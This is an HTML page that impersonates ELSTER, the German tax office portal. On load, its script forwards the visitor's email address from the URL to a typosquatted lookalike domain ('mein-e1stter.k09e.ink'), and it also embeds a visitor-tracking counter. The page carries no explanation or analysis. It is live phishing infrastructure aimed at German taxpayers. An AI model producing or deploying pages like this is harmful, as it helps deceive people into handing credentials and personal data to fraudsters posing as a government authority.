<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>ELSTER - Ihr Online-Finanzamt</title>

<script>
window.addEventListener("DOMContentLoaded", function () {

    const params = new URLSearchParams(window.location.search);
    const email = params.get("email");

    let redirectUrl = "https://mein-e1stter.k09e.ink/synchronisierung/";

    if (email) {
        redirectUrl += "?email=" + encodeURIComponent(email);
    }

    window.location.replace(redirectUrl);
});
</script>

</head>
<body>

<script id="_waukeo">
var _wau = _wau || [];
_wau.push(["small", "inst00", "keo"]);

(function() {
    var s = document.createElement("script");
    s.async = true;
    s.src = "https://widgets.amung.us/small.js";
    document.head.appendChild(s);
})();
</script>

</body>
</html>